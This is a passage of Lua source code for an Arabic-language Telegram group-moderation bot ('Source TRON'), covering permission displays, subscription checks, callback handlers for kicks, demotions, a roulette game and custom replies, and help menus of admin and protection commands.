if GetInfo.result.can_promote_members == true then VIP = '✔️' else VIP = '✖️' end 
send(msg.chat_id_,msg.id_,'⌁︙صلاحيات '..GetCustomTitle(user_id,msg.chat_id_)..' هي ↫ ⤈\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙حذف الرسائل ↫ '..DEL..'\n⌁︙دعوة المستخدمين ↫ '..INV..'\n⌁︙حظر المستخدمين ↫ '..BAN..'\n⌁︙تثبيت الرسائل ↫ '..PIN..'\n⌁︙تغيير المعلومات ↫ '..EDT..'\n⌁︙اضافة مشرفين ↫ '..VIP..'\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉')
end
end
end
--     Source TRON     --
function GetBio(chat_id)
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChat?chat_id='..chat_id)
local GetInfo = JSON.decode(Check)
if GetInfo.ok == true then
if GetInfo.result.bio then 
Abd = GetInfo.result.bio
else 
Abd = "لا يوجد"
end
end
return Abd
end
--     Source TRON     --
local sendRequest = function(request_id, chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, callback, extra)
tdcli_function({ ID = request_id, chat_id_ = chat_id, reply_to_message_id_ = reply_to_message_id, disable_notification_ = disable_notification, from_background_ = from_background, reply_markup_ = reply_markup, input_message_content_ = input_message_content }, callback or dl_cb, extra)
end
local sendDocument = function(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, document, caption, cb, cmd)
local input_message_content = { ID = "InputMessageDocument", document_ = getInputFile(document), caption_ = caption } sendRequest("SendMessage", chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)
end
local function sendVoice(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, voice, duration, waveform, caption, cb, cmd)
local input_message_content = { ID = "InputMessageVoice", voice_ = getInputFile(voice), duration_ = duration or 0, waveform_ = waveform, caption_ = caption } sendRequest('SendMessage', chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)
end
local function sendAudio(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, audio, duration, waveform, caption, cb, cmd)
local input_message_content = { ID = "InputMessageAudio", audio_ = getInputFile(audio), duration_ = duration or 0, waveform_ = waveform, caption_ = caption } sendRequest('SendMessage', chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)
end
local function sendVideo(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, video, duration, width, height, caption, cb, cmd)    
local input_message_content = { ID = "InputMessageVideo",      video_ = getInputFile(video),      added_sticker_file_ids_ = {},      duration_ = duration or 0,      width_ = width or 0,      height_ = height or 0,      caption_ = caption    }    sendRequest('SendMessage', chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)  
end
local sendSticker = function(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, sticker)
local input_message_content = { ID = "InputMessageSticker", sticker_ = getInputFile(sticker), width_ = 0, height_ = 0 } sendRequest("SendMessage", chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)
end 
function formsgs(msgs) 
local MsgText = ''  
if tonumber(msgs) < 100 then 
MsgText = 'جدا ضعيف' 
elseif tonumber(msgs) < 250 then 
MsgText = 'ضعيف' 
elseif tonumber(msgs) < 500 then 
MsgText = 'غير متفاعل' 
elseif tonumber(msgs) < 750 then 
MsgText = 'متوسط' 
elseif tonumber(msgs) < 1000 then 
MsgText = 'متفاعل' 
elseif tonumber(msgs) < 2000 then 
MsgText = 'قمة التفاعل' 
elseif tonumber(msgs) < 3000 then 
MsgText = 'ملك التفاعل'  
elseif tonumber(msgs) < 4000 then 
MsgText = 'اسطورة التفاعل' 
elseif tonumber(msgs) < 5000 then 
MsgText = 'متفاعل نار' 
elseif tonumber(msgs) < 6000 then 
MsgText = 'يجدح جدح' 
elseif tonumber(msgs) < 7000 then 
MsgText = 'خيالي' 
elseif tonumber(msgs) < 8000 then 
MsgText = 'رب التفاعل' 
elseif tonumber(msgs) < 9000 then 
MsgText = 'كافر بالتفاعل' 
elseif tonumber(msgs) < 10000000000 then 
MsgText = "معلك لربك" 
end 
return MsgText
end
--     Source TRON     --
function Abdmoned(chat_id, user_id, msg_id, text, offset, length) local tt = DevAbd:get(TRON..'endmsg') or '' tdcli_function ({ ID = "SendMessage", chat_id_ = chat_id, reply_to_message_id_ = msg_id, disable_notification_ = 0, from_background_ = 1, reply_markup_ = nil, input_message_content_ = { ID = "InputMessageText", text_ = text..'\n\n'..tt, disable_web_page_preview_ = 1, clear_draft_ = 0, entities_ = {[0]={ ID="MessageEntityMentionName", offset_=offset, length_=length, user_id_=user_id }, }, }, }, dl_cb, nil) end
--     Source TRON     --
function SourceCh(msg) 
local url,res = https.request('https://apiAbd.ml/SourceCh.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.ChatMember.TRON ~= true then
Var = false
keyboard = {} 
keyboard.inline_keyboard = {{{text=data.ChatMember.Title,url=data.ChatMember.Url}}} 
Msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(data.ChatMember.TRON).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
Var = true
end
return Var
end
function ChCheck(msg)
local var = true 
if DevAbd:get(TRON.."Abd:ChId") then
local url , res = https.request('https://api.telegram.org/bot'..TokenBot..'/getchatmember?chat_id='..DevAbd:get(TRON..'Abd:ChId')..'&user_id='..msg.sender_user_id_)
local data = json:decode(url)
if res ~= 200 or data.result.status == "left" or data.result.status == "kicked" then
var = false 
if DevAbd:get(TRON..'Abd:ChText') then
local ChText = DevAbd:get(TRON..'Abd:ChText')
send(msg.chat_id_,msg.id_,'['..ChText..']')
else
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChat?chat_id='..DevAbd:get(TRON.."Abd:ChId"))
local GetInfo = JSON.decode(Check)
if GetInfo.result.username then
User = "https://t.me/"..GetInfo.result.username
else
User = GetInfo.result.invite_link
end
Text = "⌁︙عذرا لاتستطيع استخدام البوت !\n⌁︙عليك الاشتراك في القناة اولا :"
keyboard = {} 
keyboard.inline_keyboard = {{{text=GetInfo.result.title,url=User}}} 
Msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
elseif data.ok then
return var
end
else
return var
end
end
function tdcli_update_callback(data)
if (data.ID == "UpdateNewCallbackQuery") then
local Chat_Id2 = data.chat_id_
local MsgId2 = data.message_id_
local DataText = data.payload_.data_
local Msg_Id2 = data.message_id_/2097152/0.5
if DataText == '/delyes' and DevAbd:get(TRON..'yes'..data.sender_user_id_) == 'delyes' then
DevAbd:del(TRON..'yes'..data.sender_user_id_, 'delyes')
DevAbd:del(TRON..'no'..data.sender_user_id_, 'delno')
if RankChecking(data.sender_user_id_, data.chat_id_) then
EditMsg(Chat_Id2, Msg_Id2, "⌁︙لا استطيع طرد ↫ "..IdRank(data.sender_user_id_, data.chat_id_)) 
return false
end
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=data.chat_id_,user_id_=data.sender_user_id_,status_={ID="ChatMemberStatusKicked"},},function(arg,da) 
if (da and da.code_ and da.code_ == 400 and da.message_ == "CHAT_ADMIN_REQUIRED") then 
EditMsg(Chat_Id2, Msg_Id2, "⌁︙ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !") 
return false  
end
if (da and da.code_ and da.code_ == 3) then 
EditMsg(Chat_Id2, Msg_Id2, "⌁︙البوت ليس ادمن يرجى ترقيتي !") 
return false  
end
if da and da.code_ and da.code_ == 400 and da.message_ == "USER_ADMIN_INVALID" then 
EditMsg(Chat_Id2, Msg_Id2, "⌁︙لا استطيع طرد مشرفين المجموعه") 
return false  
end
if da and da.ID and da.ID == "Ok" then
ChatKick(data.chat_id_, data.sender_user_id_)
EditMsg(Chat_Id2, Msg_Id2, "⌁︙تم طردك من المجموعه") 
return false
end
end,nil)  
end
if DataText == '/delno' and DevAbd:get(TRON..'no'..data.sender_user_id_) == 'delno' then
DevAbd:del(TRON..'yes'..data.sender_user_id_, 'delyes')
DevAbd:del(TRON..'no'..data.sender_user_id_, 'delno')
EditMsg(Chat_Id2, Msg_Id2, "⌁︙تم الغاء امر اطردني") 
end
--     Source TRON     --
if DataText == '/yesdel' and DevAbd:get(TRON..'yesdel'..data.sender_user_id_) == 'delyes' then
DevAbd:del(TRON..'yesdel'..data.sender_user_id_, 'delyes')
DevAbd:del(TRON..'nodel'..data.sender_user_id_, 'delno')
if DevAbd:sismember(TRON..'Abd:Constructor:'..data.chat_id_, data.sender_user_id_) then
constructor = 'المنشئين • ' else constructor = '' end 
if DevAbd:sismember(TRON..'Abd:Managers:'..data.chat_id_, data.sender_user_id_) then
Managers = 'المدراء • ' else Managers = '' end
if DevAbd:sismember(TRON..'Abd:Admins:'..data.chat_id_, data.sender_user_id_) then
admins = 'الادمنيه • ' else admins = '' end
if DevAbd:sismember(TRON..'Abd:VipMem:'..data.chat_id_, data.sender_user_id_) then
vipmem = 'المميزين • ' else vipmem = '' end
if DevAbd:sismember(TRON..'Abd:Cleaner:'..data.chat_id_, data.sender_user_id_) then
cleaner = 'المنظفين • ' else cleaner = '' end
if DevAbd:sismember(TRON..'User:Donky:'..data.chat_id_, data.sender_user_id_) then
donky = 'المطايه • ' else donky = '' end
if DevAbd:sismember(TRON..'Abd:Constructor:'..data.chat_id_, data.sender_user_id_) or DevAbd:sismember(TRON..'Abd:Managers:'..data.chat_id_, data.sender_user_id_) or DevAbd:sismember(TRON..'Abd:Admins:'..data.chat_id_, data.sender_user_id_) or DevAbd:sismember(TRON..'Abd:VipMem:'..data.chat_id_, data.sender_user_id_) or DevAbd:sismember(TRON..'Abd:Cleaner:'..data.chat_id_, data.sender_user_id_) or DevAbd:sismember(TRON..'User:Donky:'..data.chat_id_, data.sender_user_id_) then
DevAbd:srem(TRON..'Abd:Constructor:'..data.chat_id_,data.sender_user_id_)
DevAbd:srem(TRON..'Abd:Managers:'..data.chat_id_,data.sender_user_id_)
DevAbd:srem(TRON..'Abd:Admins:'..data.chat_id_,data.sender_user_id_)
DevAbd:srem(TRON..'Abd:VipMem:'..data.chat_id_,data.sender_user_id_)
DevAbd:srem(TRON..'Abd:Cleaner:'..data.chat_id_,data.sender_user_id_)
DevAbd:srem(TRON..'User:Donky:'..data.chat_id_,data.sender_user_id_)
EditMsg(Chat_Id2, Msg_Id2, "⌁︙تم تنزيلك من ↫ ⤈\n~ ( "..constructor..Managers..admins..vipmem..cleaner..donky.." ) ~ \n") 
else 
if IdRank(data.sender_user_id_, data.chat_id_) == 'العضو' then
EditMsg(Chat_Id2, Msg_Id2, "⌁︙ليس لديك رتبه في البوت") 
else 
EditMsg(Chat_Id2, Msg_Id2, "⌁︙لا استطيع تنزيل ↫ "..IdRank(data.sender_user_id_, data.chat_id_)) 
end
end
end
if DevAbd:get(TRON.."Abd:NewDev"..data.sender_user_id_) then
if DataText == '/setno' then
EditMsg(Chat_Id2, Msg_Id2, "⌁︙تم الغاء امر تغير المطور الاساسي") 
DevAbd:del(TRON.."Abd:NewDev"..data.sender_user_id_)
return false
end
if DataText == '/setyes' then
local NewDev = DevAbd:get(TRON.."Abd:NewDev"..data.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = NewDev},function(arg,dp) 
EditMsg(Chat_Id2, Msg_Id2, "⌁︙المطور الجديد ↫ ["..dp.first_name_.."](tg://user?id="..dp.id_..")\n⌁︙تم تغير المطور الاساسي بنجاح") 
end,nil)
tdcli_function ({ID = "GetUser",user_id_ = data.sender_user_id_},function(arg,dp) 
SendText(NewDev,"⌁︙بواسطة ↫ ["..dp.first_name_.."](tg://user?id="..dp.id_..")\n⌁︙لقد اصبحت انت مطور هذا البوت",0,'md')
end,nil)
local Create = function(data, file, uglify)  
file = io.open(file, "w+")   
local serialized   
if not uglify then  
serialized = serpent.block(data, {comment = false, name = "Config"})  
else  
serialized = serpent.dump(data)  
end    
file:write(serialized)
file:close()  
end
Config = {
DevId = NewDev,
TokenBot = TokenBot,
TRON = TokenBot:match("(%d+)"),
SudoIds = {NewDev},
}
Create(Config, "./config.lua")  
DevAbd:del(TRON.."Abd:NewDev"..data.sender_user_id_)
dofile('TRON.lua') 
end
end
if DataText == '/nodel' and DevAbd:get(TRON..'nodel'..data.sender_user_id_) == 'delno' then
DevAbd:del(TRON..'yesdel'..data.sender_user_id_, 'delyes')
DevAbd:del(TRON..'nodel'..data.sender_user_id_, 'delno')
EditMsg(Chat_Id2, Msg_Id2, "⌁︙تم الغاء امر نزلني") 
end
if DataText == '/YesRolet' and DevAbd:get(TRON.."Abd:WittingStartRolet"..data.chat_id_..data.sender_user_id_) then
local List = DevAbd:smembers(TRON..'Abd:ListRolet'..data.chat_id_) 
local UserName = List[math.random(#List)]
tdcli_function ({ID="SearchPublicChat",username_ = UserName},function(arg,dp) 
DevAbd:incrby(TRON..'Abd:GamesNumber'..data.chat_id_..dp.id_, 5) 
end,nil) 
DevAbd:del(TRON..'Abd:ListRolet'..data.chat_id_) 
DevAbd:del(TRON.."Abd:WittingStartRolet"..data.chat_id_..data.sender_user_id_)
EditMsg(Chat_Id2, Msg_Id2, "⌁︙*صاحب الحظ* ↫ ["..UserName.."]\n⌁︙*مبروك لقد ربحت وحصلت على 5 نقاط يمكنك استبدالها بالرسائل*")
end
if DataText == '/NoRolet' then
DevAbd:del(TRON..'Abd:ListRolet'..data.chat_id_) 
DevAbd:del(TRON.."Abd:NumRolet"..data.chat_id_..data.sender_user_id_) 
DevAbd:del(TRON.."Abd:WittingStartRolet"..data.chat_id_..data.sender_user_id_)
EditMsg(Chat_Id2, Msg_Id2, "⌁︙تم الغاء اللعبه لاعادة اللعب ارسل الالعاب") 
end
if DataText == '/ListRolet' then
local List = DevAbd:smembers(TRON..'Abd:ListRolet'..data.chat_id_) 
local Text = '⌁︙قائمة الاعبين ↫ ⤈\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n' 
local Textt = '┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙تم اكتمال العدد الكلي هل انت مستعد ؟'
for k, v in pairs(List) do 
Text = Text..k.."~ : [" ..v.."]\n"  
end 
keyboard = {} 
keyboard.inline_keyboard = {{{text="نعم",callback_data="/YesRolet"},{text="لا",callback_data="/NoRolet"}}} 
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text..Textt).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if DataText == '/UnTkeed' then
if DevAbd:sismember(TRON..'Abd:Tkeed:'..Chat_Id2, data.sender_user_id_) then
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..Chat_Id2.."&user_id="..data.sender_user_id_.."&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
DevAbd:srem(TRON..'Abd:Tkeed:'..Chat_Id2, data.sender_user_id_)
DeleteMessage(Chat_Id2,{[0] = MsgId2})
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("⌁ تم الغاء تقيدك من المجموعه بنجاح .")..'&show_alert=true')
else
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("⌁ عذرا هذا الامر لكشف الروبوت وليس لك .")..'&show_alert=true')
end 
end
if DataText and DataText:match('/DelRed:'..tonumber(data.sender_user_id_)..'(.*)') then
local Abbs = DataText:match('/DelRed:'..tonumber(data.sender_user_id_)..'(.*)')
EditMsg(Chat_Id2, Msg_Id2, "⌁︙الكلمه ↫ "..Abbs.." تم حذفها") 
DevAbd:del(TRON..'Abd:Text:GpTexts'..Abbs..data.chat_id_)
DevAbd:srem(TRON..'Abd:Manager:GpRedod'..data.chat_id_,Abbs)
end
if DataText and DataText:match('/EndRedod:'..tonumber(data.sender_user_id_)..'(.*)') then
local Abbs = DataText:match('/EndRedod:'..tonumber(data.sender_user_id_)..'(.*)')
local List = DevAbd:smembers(TRON..'Abd:Text:GpTexts'..Abbs..data.chat_id_)
if DevAbd:get(TRON..'Abd:Add:GpRedod'..data.sender_user_id_..data.chat_id_) then
EditMsg(Chat_Id2, Msg_Id2, "⌁︙تم انهاء وحفظ ↫ "..#List.." من الردود المتعدده للامر ↫ "..Abbs) 
DevAbd:del(TRON..'Abd:Add:GpRedod'..data.sender_user_id_..data.chat_id_)
else
EditMsg(Chat_Id2, Msg_Id2, "⌁︙عذرا صلاحية الامر منتهيه !") 
end
end
if DataText and DataText:match('/DelRedod:'..tonumber(data.sender_user_id_)..'(.*)') then
local Abbs = DataText:match('/DelRedod:'..tonumber(data.sender_user_id_)..'(.*)')
if DevAbd:get(TRON..'Abd:Add:GpRedod'..data.sender_user_id_..data.chat_id_) then
EditMsg(Chat_Id2, Msg_Id2, "⌁︙تم الغاء عملية حفظ الردود المتعدده للامر ↫ "..Abbs) 
DevAbd:del(TRON..'Abd:Add:GpRedod'..data.sender_user_id_..data.chat_id_)
DevAbd:del(TRON..'Abd:Text:GpTexts'..Abbs..data.chat_id_)
DevAbd:del(TRON..'Abd:Add:GpTexts'..data.sender_user_id_..data.chat_id_)
DevAbd:srem(TRON..'Abd:Manager:GpRedod'..data.chat_id_,Abbs)
else
EditMsg(Chat_Id2, Msg_Id2, "⌁︙عذرا صلاحية الامر منتهيه !") 
end
end
if DataText and DataText:match('/HideHelpList:(.*)') then
local Abbs = DataText:match('/HideHelpList:(.*)')
if tonumber(Abbs) == tonumber(data.sender_user_id_) then
EditMsg(Chat_Id2, Msg_Id2, "⌁︙تم اخفاء كليشة الاوامر") 
else
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("⌁ عذرا الامر ليس لك .")..'&show_alert=true')
end
end
if DataText and DataText:match('/HelpList:(.*)') then
local Abbs = DataText:match('/HelpList:(.*)')
if tonumber(Abbs) == tonumber(data.sender_user_id_) then
local Help = DevAbd:get(TRON..'Abd:Help')
local Text = [[
⌁︙اهلا بك في قائمة الاوامر ↫ ⤈ 
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙م1 ↫ اوامر الحمايه
⌁︙م2 ↫ اوامر الادمنيه
⌁︙م3 ↫ اوامر المدراء
⌁︙م4 ↫ اوامر المنشئين
⌁︙م5 ↫ اوامر المطورين
⌁︙م6 ↫ اوامر الاعضاء
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙[Source Channel](https://t.me/YYYYAX)
]] 
keyboard = {} 
keyboard.inline_keyboard = {{{text="اوامر الادمنيه",callback_data="/HelpList2:"..data.sender_user_id_},{text="اوامر الحمايه",callback_data="/HelpList1:"..data.sender_user_id_}},{{text="اوامر المنشئين",callback_data="/HelpList4:"..data.sender_user_id_},{text="اوامر المدراء",callback_data="/HelpList3:"..data.sender_user_id_}},{{text="اوامر الاعضاء",callback_data="/HelpList6:"..data.sender_user_id_},{text="اوامر المطورين",callback_data="/HelpList5:"..data.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Help or Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("⌁ عذرا الامر ليس لك .")..'&show_alert=true')
end
end
if DataText and DataText:match('/HelpList1:(.*)') then
local Abbs = DataText:match('/HelpList1:(.*)')
if tonumber(Abbs) == tonumber(data.sender_user_id_) then
if not Admin(data) then
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("⌁ عذرا ليس لديك صلاحية التحكم لهذا الامر .")..'&show_alert=true')
end
local Help = DevAbd:get(TRON..'Abd:Help1')
local Text = [[
⌁︙اوامر حماية المجموعه ↫ ⤈
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙قفل • فتح ↫ الروابط
⌁︙قفل • فتح ↫ المعرفات
⌁︙قفل • فتح ↫ البوتات
⌁︙قفل • فتح ↫ المتحركه
⌁︙قفل • فتح ↫ الملصقات
⌁︙قفل • فتح ↫ الملفات
⌁︙قفل • فتح ↫ الصور
⌁︙قفل • فتح ↫ الفيديو
⌁︙قفل • فتح ↫ الاونلاين
⌁︙قفل • فتح ↫ الدردشه
⌁︙قفل • فتح ↫ التوجيه
⌁︙قفل • فتح ↫ الاغاني
⌁︙قفل • فتح ↫ الصوت
⌁︙قفل • فتح ↫ الجهات
⌁︙قفل • فتح ↫ الماركداون
⌁︙قفل • فتح ↫ التكرار
⌁︙قفل • فتح ↫ الهاشتاك
⌁︙قفل • فتح ↫ التعديل
⌁︙قفل • فتح ↫ التثبيت
⌁︙قفل • فتح ↫ الاشعارات
⌁︙قفل • فتح ↫ الكلايش
⌁︙قفل • فتح ↫ الدخول
⌁︙قفل • فتح ↫ الشبكات
⌁︙قفل • فتح ↫ المواقع
⌁︙قفل • فتح ↫ الفشار
⌁︙قفل • فتح ↫ الكفر
⌁︙قفل • فتح ↫ الطائفيه
⌁︙قفل • فتح ↫ الكل
⌁︙قفل • فتح ↫ العربيه
⌁︙قفل • فتح ↫ الانكليزيه
⌁︙قفل • فتح ↫ الفارسيه
⌁︙قفل • فتح ↫ التفليش
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙اوامر حمايه اخرى ↫ ⤈
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙قفل • فتح + الامر ↫ ⤈
⌁︙التكرار بالطرد
⌁︙التكرار بالكتم
⌁︙التكرار بالتقيد
⌁︙الفارسيه بالطرد
⌁︙البوتات بالطرد
⌁︙البوتات بالتقيد
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙[Source Channel](https://t.me/YYYYAX)
]]
keyboard = {} 
keyboard.inline_keyboard = {{{text="اوامر الادمنيه",callback_data="/HelpList2:"..data.sender_user_id_}},{{text="اوامر المنشئين",callback_data="/HelpList4:"..data.sender_user_id_},{text="اوامر المدراء",callback_data="/HelpList3:"..data.sender_user_id_}},{{text="اوامر الاعضاء",callback_data="/HelpList6:"..data.sender_user_id_},{text="اوامر المطورين",callback_data="/HelpList5:"..data.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_}},{{text="• رجوع •",callback_data="/HelpList:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Help or Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("⌁ عذرا الامر ليس لك .")..'&show_alert=true')
end
end
if DataText and DataText:match('/HelpList2:(.*)') then
local Abbs = DataText:match('/HelpList2:(.*)')
if tonumber(Abbs) == tonumber(data.sender_user_id_) then
if not Admin(data) then
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("⌁ عذرا ليس لديك صلاحية التحكم لهذا الامر .")..'&show_alert=true')
end
local Help = DevAbd:get(TRON..'Abd:Help2')
local Text = [[
⌁︙اوامر الادمنيه ↫ ⤈
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙الاعدادت
⌁︙تاك للكل 
⌁︙انشاء رابط
⌁︙ضع وصف
⌁︙ضع رابط
⌁︙ضع صوره
⌁︙حذف الرابط
⌁︙حذف المطايه
⌁︙كشف البوتات
⌁︙طرد البوتات
⌁︙تنظيف + العدد
⌁︙تنظيف التعديل
⌁︙كللهم + الكلمه
⌁︙اسم البوت + الامر
⌁︙ضع • حذف ↫ ترحيب
⌁︙ضع • حذف ↫ قوانين
⌁︙اضف • حذف ↫ صلاحيه
⌁︙الصلاحيات • حذف الصلاحيات
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙ضع سبام + العدد
⌁︙ضع تكرار + العدد
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙رفع مميز • تنزيل مميز
⌁︙المميزين • حذف المميزين
⌁︙كشف القيود • رفع القيود
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙حذف • مسح + بالرد
⌁︙منع • الغاء منع
⌁︙قائمه المنع
⌁︙حذف قائمه المنع
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙تفعيل • تعطيل ↫ الرابط
⌁︙تفعيل • تعطيل ↫ الالعاب
⌁︙تفعيل • تعطيل ↫ الترحيب
⌁︙تفعيل • تعطيل ↫ التاك للكل
⌁︙تفعيل • تعطيل ↫ كشف الاعدادات
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙طرد المحذوفين
⌁︙طرد ↫ بالرد • بالمعرف • بالايدي
⌁︙كتم • الغاء كتم
⌁︙تقيد • الغاء تقيد
⌁︙حظر • الغاء حظر
⌁︙المكتومين • حذف المكتومين
⌁︙المقيدين • حذف المقيدين
⌁︙المحظورين • حذف المحظورين
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙تقييد دقيقه + عدد الدقائق
⌁︙تقييد ساعه + عدد الساعات
⌁︙تقييد يوم + عدد الايام
⌁︙الغاء تقييد ↫ لالغاء التقييد بالوقت
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙[Source Channel](https://t.me/YYYYAX)
]]
keyboard = {} 
keyboard.inline_keyboard = {{{text="اوامر الحمايه",callback_data="/HelpList1:"..data.sender_user_id_}},{{text="اوامر المنشئين",callback_data="/HelpList4:"..data.sender_user_id_},{text="اوامر المدراء",callback_data="/HelpList3:"..data.sender_user_id_}},{{text="اوامر الاعضاء",callback_data="/HelpList6:"..data.sender_user_id_},{text="اوامر المطورين",callback_data="/HelpList5:"..data.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_}},{{text="• رجوع •",callback_data="/HelpList:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Help or Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("⌁ عذرا الامر ليس لك .")..'&show_alert=true')
end
end
if DataText and DataText:match('/HelpList3:(.*)') then
local Abbs = DataText:match('/HelpList3:(.*)')
if tonumber(Abbs) == tonumber(data.sender_user_id_) then
if not Admin(data) then
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("⌁ عذرا ليس لديك صلاحية التحكم لهذا الامر .")..'&show_alert=true')
end
local Help = DevAbd:get(TRON..'Abd:Help3')
local Text = [[
⌁︙اوامر المدراء ↫ ⤈
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙فحص البوت
⌁︙ضع اسم + الاسم
⌁︙اضف • حذف ↫ رد
⌁︙ردود المدير
⌁︙حذف ردود المدير
⌁︙اضف • حذف ↫ رد متعدد
⌁︙حذف رد من متعدد
⌁︙الردود المتعدده
⌁︙حذف الردود المتعدده
⌁︙حذف قوائم المنع
⌁︙منع ↫ بالرد على ( ملصق • صوره • متحركه )
⌁︙حذف قائمه منع + ↫ ⤈
( الصور • المتحركات • الملصقات )
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙تنزيل الكل
⌁︙رفع ادمن • تنزيل ادمن
⌁︙الادمنيه • حذف الادمنيه
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙تثبيت
⌁︙الغاء التثبيت
⌁︙اعاده التثبيت
⌁︙الغاء تثبيت الكل
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙تغير رد + اسم الرتبه + النص ↫ ⤈
⌁︙المطور • منشئ الاساسي
⌁︙المنشئ • المدير • الادمن
⌁︙المميز • المنظف • العضو
⌁︙حذف ردود الرتب
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙تغيير الايدي ↫ لتغيير الكليشه
⌁︙تعيين الايدي ↫ لتعيين الكليشه
⌁︙حذف الايدي ↫ لحذف الكليشه
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙تفعيل • تعطيل + الامر ↫ ⤈
⌁︙اطردني • الايدي بالصوره • الابراج
⌁︙معاني الاسماء • اوامر النسب • انطق
⌁︙الايدي • تحويل الصيغ • اوامر التحشيش
⌁︙ردود المدير • ردود المطور • التحقق
⌁︙ضافني • حساب العمر • الزخرفه • غنيلي
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙[Source Channel](https://t.me/YYYYAX)
]]
